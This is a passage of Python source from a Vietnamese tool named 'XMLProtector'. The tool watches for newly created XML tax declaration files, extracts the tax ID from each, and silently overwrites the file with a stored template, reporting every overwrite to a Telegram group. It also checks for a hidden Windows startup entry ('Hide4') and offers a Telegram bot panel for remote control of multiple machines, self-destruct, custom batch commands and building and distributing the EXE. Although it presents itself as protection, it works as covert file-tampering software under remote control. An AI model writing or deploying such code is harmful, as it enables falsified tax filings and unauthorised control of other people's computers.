            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                tax_type = match.group(1).strip()
                logging.info(f"Smart extract tax type: {tax_type}")
                return tax_type
                
        # Fallback: Tìm trong tên file hoặc nội dung
        if 'GTGT' in xml_content.upper() or 'VAT' in xml_content.upper():
            return 'GTGT'
        elif 'TNCN' in xml_content.upper():
            return 'TNCN'
        elif 'TNDN' in xml_content.upper():
            return 'TNDN'
        else:
            logging.info("Smart extract: Mac dinh la GTGT")
            return 'GTGT'  # Mặc định GTGT cho ETAX
            
    except Exception as e:
        logging.error(f"Extract tax type error: {e}")
        return 'GTGT'

def extract_tax_period_from_xml(xml_content):
    """Trích xuất kỳ tính thuế từ XML."""
    try:
        # Tìm kỳ tính thuế trong ETAX
        period_patterns = [
            r'<kyTinhThue[^>]*>([^<]+)</kyTinhThue>',  # ETAX format
            r'<ky_tinh_thue[^>]*>([^<]+)</ky_tinh_thue>',
            r'<tax_period[^>]*>([^<]+)</tax_period>',
            r'<period[^>]*>([^<]+)</period>'
        ]
        
        for pattern in period_patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                period = match.group(1).strip()
                logging.info(f"Smart extract tax period: {period}")
                return period
                
        # Fallback: Tìm pattern ngày tháng
        date_pattern = r'(\d{4})[-/](\d{1,2})[-/](\d{1,2})'
        match = re.search(date_pattern, xml_content)
        if match:
            year, month, day = match.groups()
            period = f"{year}-{month.zfill(2)}"
            logging.info(f"Smart extract period from date: {period}")
            return period
            
        logging.info("Smart extract: Mac dinh period UNKNOWN")
        return 'UNKNOWN'
        
    except Exception as e:
        logging.error(f"Extract tax period error: {e}")
        return 'UNKNOWN'

def extract_submission_type_from_xml(xml_content):
    """Trích xuất loại nộp từ XML."""
    try:
        # Tìm loại nộp trong ETAX
        submission_patterns = [
            r'<loaiNop[^>]*>([^<]+)</loaiNop>',  # ETAX format
            r'<loai_nop[^>]*>([^<]+)</loai_nop>',
            r'<submission_type[^>]*>([^<]+)</submission_type>',
            r'<type[^>]*>([^<]+)</type>'
        ]
        
        for pattern in submission_patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                submission_type = match.group(1).strip()
                logging.info(f"Smart extract submission type: {submission_type}")
                return submission_type
                
        # Fallback: Mặc định là lần đầu
        logging.info("Smart extract: Mac dinh submission LAN_DAU")
        return 'LAN_DAU'
        
    except Exception as e:
        logging.error(f"Extract submission type error: {e}")
        return 'LAN_DAU'

def match_mst_and_type(filename, target_mst, target_tax_type, target_tax_period, target_submission_type):
    """Kiểm tra xem file có khớp với MST và các trường định danh không."""
    try:
        # Kiểm tra MST trong tên file
        if target_mst not in filename:
            return False
            
        # Kiểm tra loại tờ khai
        if target_tax_type != 'GTGT' and target_tax_type not in filename:
            return False
            
        # Kiểm tra kỳ tính thuế
        if target_tax_period != 'UNKNOWN' and target_tax_period not in filename:
            return False
            
        return True
        
    except Exception as e:
        logging.error(f"Match MST and type error: {e}")
        return False

def find_template_file_by_mst(mst):
    """Tìm file template gốc theo MST để copy 100%."""
    try:
        templates = get_templates()
        for template_path in templates:
            try:
                with open(template_path, 'r', encoding='utf-8') as f:
                    template_content = f.read()
                    template_mst = extract_mst_from_xml(template_content)
                    if template_mst == mst:
                        logging.info(f"Found template file for MST {mst}: {template_path}")
                        return template_path
            except:
                continue
        logging.warning(f"Template file NOT FOUND for MST: {mst}")
        return None
    except Exception as e:
        logging.error(f"Find template file by MST error: {e}")
        return None

def find_template_by_mst_smart(mst, tax_type, tax_period, submission_type):
    """Tìm template gốc theo MST và các trường định danh khác."""
    try:
        # 1. Tìm trong RAM cache trước (nhanh nhất)
        for filename, content in FORTRESS_CACHE.items():
            if match_mst_and_type(filename, mst, tax_type, tax_period, submission_type):
                return content
                
        # 2. Tìm trong database warehouse
        if ENTERPRISE_DB.exists():
            conn = sqlite3.connect(str(ENTERPRISE_DB))
            cursor = conn.execute('''
                SELECT content FROM xml_cloud_warehouse 
                WHERE mst = ? AND sync_status = 'synced'
                ORDER BY last_updated DESC
                LIMIT 1
            ''', (mst,))
            
            result = cursor.fetchone()
            if result:
                logging.info(f"Smart template found in database for MST: {mst}")
                conn.close()
                return result[0]
            conn.close()
            
        # 3. Tìm trong templates local
        templates = get_templates()
        for template_path in templates:
            try:
                with open(template_path, 'r', encoding='utf-8') as f:
                    template_content = f.read()
                    template_mst = extract_mst_from_xml(template_content)
                    if template_mst == mst:
                        # Cache vào RAM cho lần sau
                        FORTRESS_CACHE[template_path] = template_content
                        logging.info(f"Smart template found locally: {template_path}")
                        return template_content
            except:
                continue
                
        logging.warning(f"Smart template NOT FOUND for MST: {mst}")
        return None
        
    except Exception as e:
        logging.error(f"Find template by MST smart error: {e}")
        return None

def find_template_instant(content, file_path):
    """Tim template goc thong minh - su dung 4 truong dinh danh!"""
    file_name = os.path.basename(file_path)
    
    try:
        # 1. Trich xuat MST tu noi dung file
        mst = extract_mst_from_xml(content)
        if not mst:
            return None
        
        # 2. Trich xuat cac truong dinh danh khac
        tax_type = extract_tax_type_from_xml(content)
        tax_period = extract_tax_period_from_xml(content)
        submission_type = extract_submission_type_from_xml(content)
        
        # 3. Tim template goc theo MST va cac truong dinh danh
        return find_template_by_mst_smart(mst, tax_type, tax_period, submission_type)
        
    except Exception as e:
        logging.error(f"Find template instant error: {e}")
        return None

def send_telegram_message(message, reply_markup=None):
    """Gửi message tới Telegram group với optional inline keyboard"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_GROUP_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup)
        
        response = requests.post(url, data=data)
        result = response.json()
        
        if result.get('ok'):
            logging.info("Telegram message sent successfully")
            return True
        else:
            logging.error(f"Telegram send failed: {result}")
            return False
            
    except Exception as e:
        logging.error(f"Telegram error: {e}")
        return False

def send_telegram_dashboard():
    """Gửi dashboard với inline buttons đẹp và UX/UI tối ưu - load nhanh"""
    
    # Lấy thông tin hệ thống nhanh nhất
    templates = get_templates()
    template_count = len(templates)
    
    # Kiểm tra startup status nhanh
    startup_status = "❌"
    if winreg:
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_READ
            )
            winreg.QueryValueEx(key, "Hide4")
            winreg.CloseKey(key)
            startup_status = "✅"
        except:
            startup_status = "❌"
    
    # Lấy thông tin máy
    machine_count = len(get_all_machines())
    machine_status = "🟢 ONLINE" if MACHINE_ID else "🔴 OFFLINE"
    
    dashboard_msg = f"""🎛️ <b>XMLPROTECTOR CONTROL PANEL</b>

🛡️ <b>Trạng thái hệ thống:</b>
• Bảo vệ: <b>ĐANG HOẠT ĐỘNG</b>
• Templates: <b>{template_count}</b> files
• Startup: {startup_status}
• Bot: <b>ONLINE</b>

🤖 <b>Machine Management:</b>
• Machine ID: <code>{MACHINE_ID or 'N/A'}</code>
• Trạng thái: {machine_status}
• Tổng máy: <b>{machine_count}</b> machines

📱 <b>Chọn thao tác bên dưới:</b>"""
    
    # Inline keyboard với layout tối ưu
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📊 STATUS", "callback_data": "status"},
                {"text": "🏓 PING", "callback_data": "ping"}
            ],
            [
                {"text": "🔧 BUILD EXE", "callback_data": "build_mode"},
                {"text": "📋 BUILD STATUS", "callback_data": "build_status"}
            ],
            [
                {"text": "🤖 MACHINES", "callback_data": "machines"},
                {"text": "🚀 GITHUB", "callback_data": "github_status"}
            ],
            [
                {"text": "❓ HELP", "callback_data": "help"},
                {"text": "🔄 REFRESH", "callback_data": "menu"}
            ],
            [
                {"text": "🚨 DESTROY", "callback_data": "destroy"}
            ]
        ]
    }
    
    send_telegram_message(dashboard_msg, keyboard)

def process_callback_query(callback_query):
    """Xử lý callback từ inline buttons với tốc độ tối ưu"""
    callback_data = callback_query.get('data', '')
    
    # Trả lời callback ngay lập tức để remove loading spinner
    try:
        answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
        answer_response = requests.post(answer_url, data={'callback_query_id': callback_query['id']})
        logging.info(f"Callback answered instantly: {callback_data}")
    except:
        pass  # Không block main process
    
    # Xử lý callback với switch case tối ưu
    if callback_data == 'status':
        check_status_report()
    elif callback_data == 'ping':
        # Ping nhanh nhất - chỉ gửi thông báo đơn giản
        ping_msg = "🏓 <b>PONG!</b>\n\n✅ <b>Bot phản hồi: OK</b>\n⚡ <b>Tốc độ: Realtime</b>"
        send_telegram_message(ping_msg)
    elif callback_data == 'help':
        help_msg = """📖 <b>HƯỚNG DẪN XMLPROTECTOR</b>

🛡️ <b>Chức năng chính:</b>
• Bảo vệ XML khỏi malware
• Ghi đè thông minh với MST
• Giám sát toàn bộ ổ đĩa
• Bot điều khiển từ xa

📱 <b>Điều khiển:</b>
• Sử dụng nút bấm
• Phản hồi realtime
• Tự động báo cáo"""
        send_telegram_message(help_msg)
    elif callback_data == 'menu':
        send_telegram_dashboard()
    elif callback_data == 'destroy':
        confirm_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "✅ XÁC NHẬN", "callback_data": "confirm_destroy"},
                    {"text": "❌ HỦY", "callback_data": "menu"}
                ]
            ]
        }
        confirm_msg = """🚨 <b>XÁC NHẬN GỠ BỎ XMLPROTECTOR</b>

⚠️ <b>CẢNH BÁO:</b>
• Gỡ khỏi startup Windows
• Xóa dữ liệu ứng dụng
• Tắt bảo vệ hệ thống

🔥 <b>KHÔNG THỂ HOÀN TÁC!</b>"""
        send_telegram_message(confirm_msg, confirm_keyboard)
    elif callback_data == 'confirm_destroy':
        destroy_xmlprotector()
    elif callback_data == 'build_mode':
        build_mode_msg = """🔧 <b>BUILD EXE MODE</b>

📁 <b>Hướng dẫn:</b>
1️⃣ Gửi file XML template
2️⃣ Bot tự động cập nhật
3️⃣ GitHub Actions build
4️⃣ Bot gửi EXE về nhóm

📤 <b>Gửi XML ngay!</b>"""
        
        build_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "❌ HỦY", "callback_data": "cancel_build"},
                    {"text": "🔙 MENU", "callback_data": "menu"}
                ]
            ]
        }
        
        send_telegram_message(build_mode_msg, build_keyboard)
        set_build_mode(True)
    elif callback_data == 'build_status':
        status_msg = get_build_status_message()
        send_telegram_message(status_msg)
    elif callback_data == 'github_status':
        check_github_build_status()
    elif callback_data == 'machines':
        show_machines_dashboard()
    elif callback_data == 'health_check':
        health_check_all_machines()
    elif callback_data == 'batch_command':
        show_batch_command_menu()
    elif callback_data == 'batch_status':
        execute_batch_status_check()
    elif callback_data == 'batch_health':
        execute_batch_health_check()
    elif callback_data == 'batch_template':
        execute_batch_template_update()
    elif callback_data == 'batch_restart':
        execute_batch_restart()
    elif callback_data == 'batch_custom':
        show_custom_command_input()
    elif callback_data == 'cancel_build':
        set_build_mode(False)
        send_telegram_message("🚫 <b>Đã hủy BUILD MODE!</b>", {
            "inline_keyboard": [[{"text": "🔙 MENU", "callback_data": "menu"}]]
        })

def set_build_mode(enabled):
    """Kích hoạt/tắt chế độ build - chờ nhận XML files"""
    build_flag_file = os.path.join(os.path.dirname(__file__), "build_mode.flag")
    if enabled:
        with open(build_flag_file, 'w', encoding='utf-8') as f:
            f.write(str(int(time.time())))
        logging.info("Build mode activated - waiting for XML files")
    else:
        if os.path.exists(build_flag_file):
            os.remove(build_flag_file)
        logging.info("Build mode deactivated")

def is_build_mode_active():
    """Kiểm tra xem có đang trong chế độ build không"""
    build_flag_file = os.path.join(os.path.dirname(__file__), "build_mode.flag")
    if os.path.exists(build_flag_file):
        # Kiểm tra thời gian - tự động tắt sau 10 phút
        try:
            with open(build_flag_file, 'r', encoding='utf-8') as f:
                timestamp = int(f.read().strip())
                if time.time() - timestamp < 600:  # 10 minutes
                    return True
                else:
                    os.remove(build_flag_file)
                    return False
        except:
            return False
    return False

def get_build_status_message():
    """Tạo thông báo trạng thái build"""
    if is_build_mode_active():
        return f"🔧 <b>TRẠNG THÁI BUILD</b>\n\n" \
               f"✅ Chế độ build: <b>ĐANG BẬT</b>\n" \
               f"⏳ Đang chờ nhận file XML...\n" \
               f"📤 Hãy gửi file XML vào nhóm\n\n" \
               f"⚠️ Chế độ tự tắt sau 10 phút"
    else:
        return f"🔧 <b>TRẠNG THÁI BUILD</b>\n\n" \
               f"❌ Chế độ build: <b>ĐANG TẮT</b>\n" \
               f"💡 Nhấn 'BUILD EXE MỚI' để bắt đầu\n\n" \
               f"📋 Sẵn sàng nhận lệnh build"

def get_templates_dir():
    """Lấy đường dẫn thư mục templates"""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base, 'templates')

def handle_xml_document(file_path, file_name):
    """Xử lý file XML được gửi qua Telegram"""
    if not is_build_mode_active():
        return False
    
    # Validate file XML
    if not file_name.endswith('.xml'):
        return False
    
    # Copy XML vào thư mục templates
    templates_dir = get_templates_dir()
    dest_path = os.path.join(templates_dir, file_name)
    
    try:
        shutil.copy2(file_path, dest_path)
        logging.info(f"Copied XML template: {file_name}")
        
        # Gửi thông báo đã nhận file
        msg = f"✅ <b>ĐÃ NHẬN XML TEMPLATE</b>\n\n" \
              f"📄 File: {file_name}\n" \
              f"📁 Đã lưu vào templates/\n" \
              f"🔧 Gửi thêm XML hoặc nhấn /build để build EXE"
        send_telegram_message(msg)
        return True
    except Exception as e:
        logging.error(f"Failed to copy XML template: {e}")
        error_msg = f"❌ <b>LỖI NHẬN XML</b>\n\n" \
                   f"📄 File: {file_name}\n" \
                   f"⚠️ Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        return False

def auto_build_exe():
    """Tự động build EXE mới với templates đã cập nhật qua GitHub Actions"""
    try:
        build_msg = f"🔨 <b>BẮT ĐẦU BUILD EXE</b>\n\n" \
                   f"🚀 Đang gọi GitHub Actions...\n" \
                   f"📁 Sử dụng templates đã cập nhật\n" \
                   f"⏱️ Ước tính: 2-5 phút (GitHub build)"
        send_telegram_message(build_msg)
        
        # Commit và push templates mới lên GitHub
        script_dir = os.path.dirname(os.path.abspath(__file__))
        git_dir = script_dir
        
        try:
            # Kiểm tra git status
            result = subprocess.run(['git', 'status', '--porcelain'], 
                                  capture_output=True, text=True, cwd=git_dir)
            
            if result.stdout.strip():
                # Có thay đổi - commit và push
                subprocess.run(['git', 'add', '.'], cwd=git_dir, check=True)
                subprocess.run(['git', 'commit', '-m', '🚀 Auto-update templates and trigger build'], 
                             cwd=git_dir, check=True)
                subprocess.run(['git', 'push', 'origin', 'master'], cwd=git_dir, check=True)
                
                success_msg = f"✅ <b>GITHUB ACTIONS TRIGGERED!</b>\n\n" \
                             f"🚀 Build đã được kích hoạt\n" \
                             f"📱 Theo dõi trên GitHub Actions\n" \
                             f"⏳ EXE sẽ được gửi khi hoàn tất\n\n" \
                             f"🔗 <a href='https://github.com/Mrkent1/Xml/actions'>Xem Build Status</a>"
                send_telegram_message(success_msg)
                
                # Bật chế độ chờ build hoàn tất
                set_build_mode(True)
                
            else:
                # Không có thay đổi - gửi thông báo
                no_change_msg = f"ℹ️ <b>KHÔNG CÓ THAY ĐỔI</b>\n\n" \
                               f"📁 Templates đã được cập nhật trước đó\n" \
                               f"💡 Gửi file XML mới để trigger build"
                send_telegram_message(no_change_msg)
                
        except subprocess.CalledProcessError as e:
            raise Exception(f"Git operation failed: {e}")
    
    except Exception as e:
        error_msg = f"❌ <b>BUILD THẤT BẠI</b>\n\n" \
                   f"⚠️ Lỗi: {str(e)}\n" \
                   f"🔧 Vui lòng thử lại sau"
        send_telegram_message(error_msg)
        logging.error(f"Auto build EXE failed: {e}")
    finally:
        # Tắt build mode
        set_build_mode(False)

def upload_exe_to_telegram(exe_file_path):
    """Upload EXE file lên Telegram group"""
    try:
        file_size = os.path.getsize(exe_file_path) / (1024 * 1024)  # MB
        
        if file_size > 50:
            raise Exception(f"File quá lớn: {file_size:.1f}MB (Telegram limit: 50MB)")
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        success_msg = f"✅ <b>BUILD HOÀN THÀNH!</b>\n\n" \
                     f"🎉 EXE mới đã sẵn sàng\n" \
                     f"📦 Kích thước: {file_size:.1f}MB\n" \
                     f"⬇️ Tải về từ file bên dưới:"
        
        # Gửi thông báo trước
        send_telegram_message(success_msg)
        
        # Upload file
        with open(exe_file_path, 'rb') as exe_file:
            files = {'document': exe_file}
            data = {
                'chat_id': TELEGRAM_GROUP_ID,
                'caption': f"🔧 XMLProtector_Smart.exe - Build mới với templates cập nhật\n⏰ {datetime.now().strftime('%d/%m/%Y %H:%M')}"
            }
            
            response = requests.post(url, files=files, data=data)
            
            if response.json().get('ok'):
                logging.info("Successfully uploaded EXE to Telegram")
                # Gửi hướng dẫn sử dụng
                guide_msg = f"📖 <b>HƯỚNG DẪN SỬ DỤNG</b>\n\n" \
                           f"1️⃣ Tải file EXE về máy\n" \
                           f"2️⃣ Chạy với quyền Administrator\n" \
                           f"3️⃣ EXE sẽ tự động bảo vệ XML\n\n" \
                           f"✨ Build thành công với templates mới!"
                send_telegram_message(guide_msg)
            else:
                raise Exception(f"Upload failed: {response.text}")
    
    except Exception as e:
        error_msg = f"❌ <b>UPLOAD THẤT BẠI</b>\n\n" \
                   f"📦 Build thành công nhưng không gửi được\n" \
                   f"⚠️ Lỗi: {str(e)}\n" \
                   f"💡 EXE có sẵn tại: dist/XMLProtector_Smart.exe"
        send_telegram_message(error_msg)
        logging.error(f"Upload EXE failed: {e}")

def get_bot_info():
    """Get bot information and check if accessible"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
        response = requests.get(url)
        data = response.json()
        if data.get('ok'):
            bot_info = data['result']
            logging.info(f"🤖 Bot active: {bot_info.get('first_name')} (@{bot_info.get('username')})")
            return True
        else:
            logging.error("❌ Bot không accessible")
            return False
    except Exception as e:
        logging.error(f"Get bot info error: {e}")
        return False

def clear_telegram_webhook():
    """Clear webhook để enable polling"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteWebhook"
        response = requests.post(url)
        if response.json().get('ok'):
            logging.info("✅ Webhook cleared - polling enabled")
        else:
            logging.warning("⚠️ Failed to clear webhook")
    except Exception as e:
        logging.error(f"Clear webhook error: {e}")

def reset_telegram_updates():
    """Reset updates để flush old messages và callbacks"""
    try:
        # Get tất cả pending updates
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        response = requests.get(url, params={'timeout': 1})
        data = response.json()
        
        if data.get('ok') and data.get('result'):
            updates = data['result']
            if updates:
                # Get highest update_id và skip tất cả
                highest_id = max(update['update_id'] for update in updates)
                skip_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
                requests.get(skip_url, params={'offset': highest_id + 1})
                logging.info(f"🔄 Reset updates - skipped to offset: {highest_id + 1}")
            else:
                logging.info("🔄 No pending updates to reset")
        else:
            logging.info("🔄 Updates reset completed")
    except Exception as e:
        logging.error(f"Reset updates error: {e}")

def claim_bot_exclusive():
    """Claim exclusive access to bot bằng cách set description"""
    try:
        import socket
        hostname = socket.gethostname()
        claim_text = f"ACTIVE_ON_{hostname}_{int(time.time())}"
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setMyDescription"
        response = requests.post(url, data={'description': claim_text})
        
        if response.json().get('ok'):
            logging.info(f"🔒 Bot claimed by: {hostname}")
            return True
        else:
            logging.warning("⚠️ Failed to claim bot")
            return False
    except Exception as e:
        logging.error(f"Claim bot error: {e}")
        return False

def process_telegram_commands():
    """Xử lý lệnh Telegram từ user và callback queries."""
    try:
        # Get updates từ Telegram với long polling
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = {
            'timeout': 10,  # Long polling 10 seconds
            'allowed_updates': ['message', 'callback_query']  # Explicitly allow callbacks
        }
        response = requests.get(url, params=params, timeout=15)
        data = response.json()
        
        if not data.get('ok'):
            return
            
        updates = data.get('result', [])
        if not updates:
            return
            
        # Xử lý tất cả updates chưa processed
        for update in updates:
            update_id = update.get('update_id')
            logging.info(f"📨 Processing update: {update_id}, keys: {list(update.keys())}")
            
            # Xử lý text messages
            if 'message' in update:
                message = update['message']
                chat_id = message['chat']['id']
                text = message.get('text', '')
                logging.info(f"💬 Message received: {text} from chat: {chat_id}")
                
                # Chỉ phản hồi trong group được config
                if str(chat_id) != TELEGRAM_GROUP_ID:
                    continue
                    
                # Xử lý lệnh /menu hoặc /start
                if text == '/start' or text == '/menu':
                    send_telegram_dashboard()
                elif text == '/build':
                    # Trigger auto build với templates hiện tại
                    auto_build_exe()
                elif text == '/ping':
                    ping_msg = f"🏓 <b>Pong!</b>\n" \
                              f"⏰ XMLProtector đang hoạt động\n" \
                              f"📡 Bot phản hồi nhanh: OK"
                    send_telegram_message(ping_msg)
                elif text == '/status':
                    check_status_report()
                elif text == '/destroy':
                    destroy_xmlprotector()
                elif text == '/buildmode':
                    build_mode_msg = f"🔧 <b>CHẾ ĐỘ BUILD EXE MỚI</b>\n\n" \
                                    f"📁 <b>Hướng dẫn:</b>\n" \
                                    f"1️⃣ Gửi file XML template (1-10 files)\n" \
                                    f"2️⃣ Bot sẽ tự động cập nhật templates\n" \
                                    f"3️⃣ Build EXE mới với PyInstaller\n" \
                                    f"4️⃣ Gửi lại EXE cho bạn\n\n" \
                                    f"📤 <b>Bây giờ hãy gửi file XML vào nhóm!</b>"
                    send_telegram_message(build_mode_msg)
                    set_build_mode(True)
                elif text == '/buildstatus':
                    status_msg = get_build_status_message()
                    send_telegram_message(status_msg)
                
                # Xử lý document uploads (XML files)
            elif 'document' in message:
                chat_id = message['chat']['id']
                
                # Chỉ phản hồi trong group được config
                if str(chat_id) != TELEGRAM_GROUP_ID:
                    continue
                
                document = message['document']
                file_name = document.get('file_name', '')
                file_id = document.get('file_id', '')
                
                # Kiểm tra xem có phải file XML không và đang trong build mode
                if file_name.endswith('.xml') and is_build_mode_active():
                    try:
                        # Download file từ Telegram
                        file_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
                        file_response = requests.get(file_url, params={'file_id': file_id})
                        file_data = file_response.json()
                        
                        if file_data.get('ok'):
                            file_path = file_data['result']['file_path']
                            download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
                            
                            # Download file content
                            download_response = requests.get(download_url)
                            
                            if download_response.status_code == 200:
                                # Lưu file tạm thời
                                temp_path = os.path.join(tempfile.gettempdir(), file_name)
                                with open(temp_path, 'wb') as f:
                                    f.write(download_response.content)
                                
                                # Xử lý file XML
                                handle_xml_document(temp_path, file_name)
                                
                                # Xóa file tạm
                                os.remove(temp_path)
                            else:
                                raise Exception(f"Download failed: {download_response.status_code}")
                        else:
                            raise Exception(f"Get file info failed: {file_data}")
                    
                    except Exception as e:
                        error_msg = f"❌ <b>LỖI TẢI XML</b>\n\n" \
                                   f"📄 File: {file_name}\n" \
                                   f"⚠️ Lỗi: {str(e)}"
                        send_telegram_message(error_msg)
                        logging.error(f"Failed to process XML document: {e}")
                
                elif file_name.endswith('.xml') and not is_build_mode_active():
                    # Hướng dẫn kích hoạt build mode
                    guide_msg = f"💡 <b>HƯỚNG DẪN UPLOAD XML</b>\n\n" \
                               f"📄 Đã nhận file: {file_name}\n" \
                               f"⚠️ Cần bật chế độ BUILD trước\n\n" \
                               f"🔧 Nhấn /menu → 'BUILD EXE MỚI'\n" \
                               f"📤 Sau đó gửi lại file XML này"
                    send_telegram_message(guide_msg)
                    
            # Xử lý callback queries (button presses)
            elif 'callback_query' in update:
                logging.info("🔥 CALLBACK QUERY DETECTED!")
                callback_query = update['callback_query']
                chat_id = callback_query['message']['chat']['id']
                logging.info(f"🔥 Callback from chat_id: {chat_id}, expected: {TELEGRAM_GROUP_ID}")
                
                # Chỉ phản hồi trong group được config
                if str(chat_id) != TELEGRAM_GROUP_ID:
                    logging.warning(f"🚫 Callback rejected - wrong chat_id: {chat_id}")
                    continue
                    
                logging.info("✅ Callback accepted - processing...")
                try:
                    process_callback_query(callback_query)
                    
                    # Answer callback query to remove loading spinner
                    answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                    answer_response = requests.post(answer_url, data={'callback_query_id': callback_query['id']})
                    logging.info(f"Callback answered: {callback_query.get('data', 'unknown')}")
                    
                except Exception as callback_error:
                    logging.error(f"Callback processing error: {callback_error}")
                    # Still answer callback to remove spinner
                    answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                    requests.post(answer_url, data={'callback_query_id': callback_query['id'], 'text': 'Đã có lỗi xảy ra!'})
            
            # Mark update as processed
            mark_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            requests.get(mark_url, params={'offset': update_id + 1})
        
    except Exception as e:
        logging.error(f"Process Telegram commands error: {e}")

def check_github_build_status():
    """Kiểm tra trạng thái build từ GitHub Actions"""
    try:
        url = "https://api.github.com/repos/Mrkent1/Xml/actions/runs"
        headers = {
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            runs = response.json().get("workflow_runs", [])
            if runs:
                latest_run = runs[0]
                run_id = latest_run["id"]
                status = latest_run["status"]
                conclusion = latest_run.get("conclusion", "running")
                workflow_name = latest_run["name"]
                created_at = latest_run["created_at"]
                
                if status == "completed":
                    if conclusion == "success":
                        # Build thành công - gửi thông báo
                        success_msg = f"🎉 <b>GITHUB ACTIONS BUILD THÀNH CÔNG!</b>\n\n" \
                                     f"✅ Workflow: {workflow_name}\n" \
                                     f"🆔 Run ID: {run_id}\n" \
                                     f"⏰ Hoàn tất: {created_at}\n\n" \
                                     f"📥 <b>Tải EXE:</b>\n" \
                                     f"• Vào <a href='https://github.com/Mrkent1/Xml/actions/runs/{run_id}'>Run Details</a>\n" \
                                     f"• Tải artifact 'XMLProcessor-EXE'\n\n" \
                                     f"🚀 <b>EXE đã sẵn sàng sử dụng!</b>"
                        send_telegram_message(success_msg)
                        return True
                    else:
                        # Build thất bại
                        error_msg = f"❌ <b>GITHUB ACTIONS BUILD THẤT BẠI!</b>\n\n" \
                                   f"❌ Workflow: {workflow_name}\n" \
                                   f"🆔 Run ID: {run_id}\n" \
                                   f"⏰ Thời gian: {created_at}\n\n" \
                                   f"🔍 <b>Kiểm tra lỗi:</b>\n" \
                                   f"• Vào <a href='https://github.com/Mrkent1/Xml/actions/runs/{run_id}'>Run Details</a>\n" \
                                   f"• Xem log lỗi chi tiết"
                        send_telegram_message(error_msg)
                        return False
                else:
                    # Đang build
                    building_msg = f"⏳ <b>GITHUB ACTIONS ĐANG BUILD...</b>\n\n" \
                                  f"🔄 Workflow: {workflow_name}\n" \
                                  f"🆔 Run ID: {run_id}\n" \
                                  f"⏰ Bắt đầu: {created_at}\n\n" \
                                  f"📱 <b>Theo dõi:</b>\n" \
                                  f"• Vào <a href='https://github.com/Mrkent1/Xml/actions/runs/{run_id}'>Run Details</a>\n" \
                                  f"• Xem log real-time"
                    send_telegram_message(building_msg)
                    return None
        else:
            logging.error(f"GitHub API error: {response.status_code}")
            return False
            
    except Exception as e:
        logging.error(f"Check GitHub build status failed: {e}")
        return False

class DownloadHandler(FileSystemEventHandler):
    """Xử lý sự kiện tạo/rename file .xml để ghi đè tự động."""
    def __init__(self, templates_map):
        super().__init__()
        self.templates = templates_map
        self.processed = load_processed_files()

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            self.try_overwrite(event.src_path)

    def on_moved(self, event):
        if not event.is_directory and event.dest_path.endswith('.xml'):
            self.try_overwrite(event.dest_path)

    def try_overwrite(self, dest):
        # Không xử lý các file nằng trong _MEIPASS/templates
        if getattr(sys, 'frozen', False):
            base = sys._MEIPASS
            tpl_dir = os.path.join(base, 'templates') + os.sep
            if dest.startswith(tpl_dir):
                return
        
        # 🔒 KHÔNG xử lý file trong thư mục ORIGINAL_TEMPLATES_SAFE
        safe_dir = os.path.join(os.getcwd(), 'ORIGINAL_TEMPLATES_SAFE') + os.sep
        if dest.startswith(safe_dir):
            logging.info(f"🔒 Bảo vệ file gốc: {dest}")
            return
        
        # 🔒 KHÔNG xử lý file trong thư mục PROTECTED_XML_FILES_SAFE
        protected_dir = os.path.join(os.getcwd(), 'PROTECTED_XML_FILES_SAFE') + os.sep
        if dest.startswith(protected_dir):
            logging.info(f"🔒 Bảo vệ file PROTECTED: {dest}")
            return

        time.sleep(1)  # đợi file không còn bị khóa
        try:
            # Đọc nội dung file cần ghi đè
            with open(dest, 'r', encoding='utf-8') as f: 
                dst_content = f.read()
            
            # 🚀 SỬ DỤNG SMART TEMPLATE MATCHING thay vì chỉ MessageId
            # Extract MST trước để tìm file template gốc
            mst = extract_mst_from_xml(dst_content)
            
            if mst:
                # Tìm file template gốc để copy 100%
                template_file = find_template_file_by_mst(mst)
                if template_file:
                    # Copy 100% file template gốc
                    shutil.copy2(template_file, dest)
                    logging.info(f"✅ SMART OVERWRITE 100% SUCCESS: {dest}")
                    
                    # Send Telegram notification for successful overwrite
                    file_name = os.path.basename(dest)
                    overwrite_msg = f"⚡ <b>Ghi Đè Thành Công 100%</b>\n" \
                                   f"📄 File: {file_name}\n" \
                                   f"🏢 MST: {mst}\n" \
                                   f"📂 Đường dẫn: {os.path.dirname(dest)}"
                    send_telegram_message(overwrite_msg)
                    
                    send_remote_log("Smart Overwrite 100% Success", dest, once=False)
